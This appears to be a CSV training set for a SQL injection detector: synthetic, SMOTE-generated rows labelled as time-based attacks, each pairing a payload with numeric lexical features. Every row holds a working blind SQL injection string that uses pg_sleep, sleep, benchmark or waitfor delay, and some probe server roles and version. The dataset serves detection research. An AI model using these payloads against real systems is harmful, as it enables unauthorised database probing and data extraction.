id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000960,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.06900042257444704,104.02765163161288,29.027651631612883,3.578057180924598,30.0,18.0,45.0,11.027651631612883,0.2883855724406239,0.17303134346437438,0.4325783586609359,0.10600472543406576,1.1102230246251565e-16,0.027651631612882643,2.0,0.0,0.0,2.0,0.0,6.0,1.3877787807814457e-17,1.0,0.0,4.0,0.0,0.027651631612882588,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000961,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.15138328024693862,32.678593699971096,16.80715621998266,3.492371395022026,12.87143747998844,0.9357187399942193,9.871437479988437,9.0,0.3938698254761842,0.028355113333158183,0.3019172076189475,0.2758578535717101,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9357187399942195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9357187399942197
SMOTE_000962,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,1.8680286794625598,82.43420460662665,24.526313158500734,3.5311970047113403,18.526313158500734,22.815782896251832,32.473686841499266,8.618421710374816,0.22413654505306457,0.27448172630580964,0.39623968697542233,0.10514204166570348,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.3815782896251834,0.0,5.236843420749633,1.3877787807814457e-17,0.0,1.0,1.3815782896251834,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.3815782896251834,0.0,0.38157828962518336,0.6184217103748166,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.381578289625183
SMOTE_000963,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,1.0649604982084775,57.79259814691956,20.60105740758292,3.1340099591810913,13.0,10.39894259241708,26.39365555450248,8.0,0.22571736776834184,0.180063302379397,0.4553163343025123,0.13890299554974883,1.1102230246251565e-16,0.6010574075829198,0.0,0.0,0.0,0.0,0.0,5.398942592417081,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.6010574075829198,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000964,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.05020422955336052,119.0,29.706537358614057,4.014358914581737,61.0,4.0,37.0,17.0,0.5126050420168067,0.033613445378151266,0.31092436974789917,0.14285714285714285,3.9999999999999996,0.0,2.0,0.0,0.0,0.0,0.0,6.0,1.3877787807814457e-17,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000965,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9930103738895575,33.047194015938665,23.209438803187734,4.3600845582134,16.0,2.0,2.8377552127509347,12.209438803187734,0.4858487295143423,0.060731091189292784,0.08337312396634516,0.3700470553300198,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.20943880318773367,1.3877787807814457e-17,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.209438803187734,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000966,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,2.0728546914794834,71.91978112679108,22.046069664150416,3.1744366042636507,13.6552835969805,14.873711462640664,34.0,9.390786067169916,0.18765023111583626,0.20347396963090336,0.47660865294015897,0.13226714631310144,0.39078606716991704,0.0,0.0,0.0,0.0,1.609213932830083,0.0,5.390786067169917,1.3877787807814457e-17,0.0,1.0,1.609213932830083,0.390786067169917,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.609213932830083,0.0,0.609213932830083,0.39078606716991704,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.609213932830083
SMOTE_000967,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.22387526041071756,26.791358952959634,17.0,3.9122746408590108,12.791358952959637,4.208641047040363,3.0,6.791358952959636,0.47732054891942294,0.1573616416784206,0.11200273951726647,0.25331506988488994,2.7913589529596363,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000968,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,3.0108118747442876,101.15504226045076,23.623926914139332,3.105240461334852,33.177038448770475,6.141630759016378,49.76555767315571,12.07081537950819,0.3300036861556218,0.05526784563624119,0.4950055292334328,0.11972293897470423,0.5177038448770472,0.0,0.0,0.0,1.0,0.5177038448770472,0.0,9.517703844877047,1.3877787807814457e-17,0.0,0.0,1.5177038448770472,0.5177038448770472,0.0,0.0,0.5177038448770472,0.0,0.5177038448770472,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.5177038448770472,1.0,0.4822961551229527,0.5177038448770472,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.5177038448770475
SMOTE_000969,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,2.2667161826252396,94.29564016318588,28.76488155729068,3.5400104182049597,25.88293852430226,14.706350819441807,41.70635081944181,12.0,0.2723133622852515,0.15296507692634648,0.4449503349846926,0.1297712258037094,1.1102230246251565e-16,1.0,2.0,0.0,0.0,1.5882938524302257,0.0,6.0,0.4117061475697741,1.0,0.0,3.588293852430226,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5882938524302259,1.0,0.4117061475697741,0.5882938524302258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.588293852430226
SMOTE_000970,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.9891278435831787,29.206036898082026,13.743719556868863,3.0076778007243647,9.743719556868863,1.4874391137377234,12.46231734121317,5.512560886262277,0.3360147006480032,0.047981906894765274,0.421300162640403,0.19470322981682853,0.7437195568688617,0.0,0.0,0.0,0.0,0.0,0.0,2.7437195568688617,1.3877787807814457e-17,1.0251217725245532,0.0,0.0,0.7437195568688617,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000971,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,2.0534923005372083,52.72827656677182,19.29620742507886,3.1374001647785423,11.296207425078864,10.0,24.0,7.4320691416929545,0.21348442531597284,0.18991701758726626,0.455800842209439,0.1407977148873219,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.5679308583070457,0.0,4.4320691416929545,1.3877787807814457e-17,0.0,1.0,0.5679308583070457,0.0,1.0,0.0,0.4320691416929541,0.0,0.5679308583070459,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5679308583070457,0.4320691416929542,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000972,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.9284669884804192,104.62792072610154,29.627920726101536,3.6156381576333514,30.0,18.0,45.0,11.627920726101536,0.28673648152169906,0.17204188891301944,0.4301047222825486,0.11111690728273285,1.1102230246251565e-16,0.6279207261015352,2.0,0.0,0.0,2.0,0.0,6.0,1.3877787807814457e-17,1.0,0.0,4.0,0.0,0.627920726101535,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000973,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,2.1057405335501485,95.22744908667805,26.538935844760278,3.6111482063133264,23.922128310479444,18.0,38.19159623285958,15.113724543339023,0.25105222526090476,0.18988780944026085,0.40191295456597204,0.15714701073286233,2.922128310479442,0.2694679223801395,0.0,0.0,0.0,2.0,0.0,5.730532077619861,1.3877787807814457e-17,0.0,1.0,4.922128310479442,0.7305320776198605,0.2694679223801395,0.0,0.2694679223801395,0.0,1.0,1.0,0.0,0.0,0.0,0.7305320776198604,0.7305320776198605,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7305320776198605
SMOTE_000974,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.5911601614033658,41.85548329331586,17.0,3.188632365668565,13.0,0.0,17.3046999656993,11.55078332761655,0.31279457145432393,1.3877787807814457e-17,0.4102934693509658,0.27691195919471023,1.1102230246251565e-16,1.0,2.0,0.0,0.0,0.0,0.0,3.55078332761655,1.3877787807814457e-17,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000975,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,2.1147024171948106,75.4350314333558,24.980538092580105,3.5475287495450942,16.60389238148398,19.792215237032046,30.038923814839787,9.0,0.22049040936169723,0.26407222540538355,0.39571137660727773,0.11972598862564154,1.1102230246251565e-16,0.3961076185160213,0.0,0.0,0.0,1.0,0.0,5.2077847629679574,0.3961076185160213,0.0,1.0,0.9999999999999999,0.0,0.3961076185160213,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.3961076185160213,0.6038923814839787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000976,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,1.1950890967573984,33.064931023065476,12.623379317956347,2.535316507994773,7.935068976934522,2.0,18.129862046130953,5.0,0.24225600384659907,0.06059785384617556,0.5456515076917865,0.1514946346154389,0.31168965897817413,0.0,0.0,0.0,0.0,0.0,0.0,3.688310341021826,1.3877787807814457e-17,0.0,0.0,0.0,0.3116896589781741,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.688310341021826,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.688310341021826
SMOTE_000977,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.1620099047895898,73.27425783836124,25.48263521833548,4.0340661334661645,34.6197641375161,2.827545072778493,21.171858482509656,14.655090145556986,0.440873581517602,0.042504782190447996,0.2716342732935609,0.24498736299838908,2.827545072778493,0.0,2.0,0.0,0.0,0.0,0.0,3.655090145556986,1.3877787807814457e-17,2.344909854443014,1.0,2.827545072778493,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.4137725363892466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4137725363892466
SMOTE_000978,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.4477277570715337,35.19912814247519,23.266594011872932,4.282270369831785,16.0,2.0,4.665940118729328,12.533188023745865,0.4636462711082364,0.05795578388852956,0.11854533204146883,0.3598526129617652,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.5331880237458653,1.3877787807814457e-17,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.26659401187293275,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000979,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.08955310334978296,33.44758759239156,17.0,3.4880808494038003,13.0,1.0,10.372989660326294,9.07459793206526,0.39002111871980455,0.03000162451690805,0.30830490428744256,0.2716723524758448,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.074597932065259,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000980,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.9465343194873626,71.33474861977463,23.889832413183083,3.4184199698126365,14.889832413183084,16.519776550910777,30.74011172454461,9.185027931136153,0.20753462933346983,0.22986263122015055,0.43321611671629234,0.12938662273008722,1.0,0.0,0.0,0.0,0.0,1.814972068863847,0.0,4.370055862272306,1.3877787807814457e-17,0.0,1.0,1.814972068863847,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8149720688638472,0.0,0.8149720688638472,0.1850279311361528,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.814972068863847
SMOTE_000981,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.4562859086987797,79.37653166822196,22.84413291705549,3.20942637616816,20.32649458394434,10.964723333777702,37.9647233337777,10.120590416722212,0.2546380929508543,0.13658320555223757,0.4803121586086656,0.1284665428882425,1.1102230246251565e-16,0.0,2.0,0.0,0.0,1.1205904167222127,0.0,6.0,1.3877787807814457e-17,1.0,0.0,3.1205904167222127,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.12059041672221278,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1205904167222127
SMOTE_000982,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.13780120796869558,40.53230511226291,16.0,2.9080583655661987,11.0,0.9610254260219095,19.61025426021909,8.961025426021909,0.27261954900345503,0.023439644537119733,0.4822323990107019,0.2217084074487234,1.1102230246251565e-16,0.0389745739780909,0.0,0.0,0.0,0.0,0.0,3.922050852043818,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.0389745739780909,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000983,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.30008660312532953,36.93141884560667,16.103490982845187,3.2666989078761537,13.0,0.0,13.724436879916302,10.206981965690371,0.3536367623500699,1.3877787807814457e-17,0.36973535968154325,0.27662787796838684,1.1102230246251565e-16,0.10349098284518587,2.0,0.0,0.0,0.0,0.0,3.1034909828451855,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.10349098284518599,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000984,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,3.4377310849661225,108.64043087703395,31.635721440468323,4.044140669142013,49.004709436565626,5.635721440468323,35.90951903968779,18.090480960312217,0.44575581003800324,0.05345286789139452,0.33222998514895713,0.16856133692164507,2.909519039687784,0.0,2.0,0.0,0.0,0.0,0.5452404801561078,6.0,1.3877787807814457e-17,0.0,1.545240480156108,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.5452404801561078,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5452404801561078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5452404801561075
SMOTE_000985,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,1.3914991701309585,64.34555086335176,18.395050078486523,3.1846147644033236,28.0,1.1975250392432617,26.75297574562198,8.395050078486523,0.44193588939555906,0.018192266563260964,0.40878676318703827,0.13108508085414172,2.4074248822702136,0.0,0.0,0.0,0.1975250392432621,0.0,0.0,4.98762519621631,1.3877787807814457e-17,0.8024749607567379,0.0,0.19752503924326215,0.8024749607567377,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1975250392432621,0.0,0.0,0.19752503924326212,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19752503924326212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.592575117729786
SMOTE_000986,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.3007082843846554,60.40849301366149,20.767203827547494,3.2207484432538473,13.043924210302245,12.213763062037998,27.320644593056997,7.830161148264249,0.21018574500318332,0.20041914325889804,0.4575660996350706,0.13182901210284806,1.1102230246251565e-16,1.0,0.0,0.0,0.0,1.2767203827547497,0.0,4.27672038275475,1.3877787807814457e-17,0.0,1.0,1.2767203827547497,0.0,1.0,0.0,0.27672038275474964,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27672038275474964,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2767203827547497
SMOTE_000987,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.0908276394698695,106.39297765270413,28.09949840376458,4.040819842767275,54.246238028234345,3.6998328012548596,32.19732482007776,16.24958200313715,0.5042810776818574,0.03714482418691761,0.28570023539956807,0.17287386273165684,3.6998328012548596,0.0,2.0,0.0,0.0,0.0,0.0,5.24958200313715,1.3877787807814457e-17,0.6003343974902801,1.0,3.69983280125486,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.84991640062743,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.84991640062743
SMOTE_000988,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,1.3398655513756756,81.463223664274,24.094766073010664,3.4767940679063987,18.094766073010664,21.736915182526662,32.90523392698934,8.726308481747335,0.22160697892335796,0.2648755825371692,0.4058923871758979,0.10762505136357502,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.2736915182526658,0.0,5.452616963494668,1.3877787807814457e-17,0.0,1.0,1.2736915182526658,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2736915182526659,0.0,0.27369151825266597,0.7263084817473341,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.273691518252666
SMOTE_000989,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.38819827961153086,43.60960118111174,23.46600021091281,4.072920251147648,17.77080080146868,2.0932000421825627,10.652400295277934,13.093200042182563,0.401148537986012,0.048286320030845375,0.24413305065227214,0.30643209133087046,2.186400084365124,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,3.7203998734523145,1.0,2.186400084365124,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.09320004218256206,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.093200042182562
SMOTE_000990,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,2.4124765178120797,75.54718841034278,23.63702415632106,3.1835656968950423,13.273140097700663,15.000908214941457,35.81851207816053,11.454628019540133,0.17450508079666896,0.1923699160715271,0.47952236001514115,0.15360264311666286,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.454628019540133,0.9999999999999999,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.45462801954013243,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5453719804598675,0.45462801954013254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
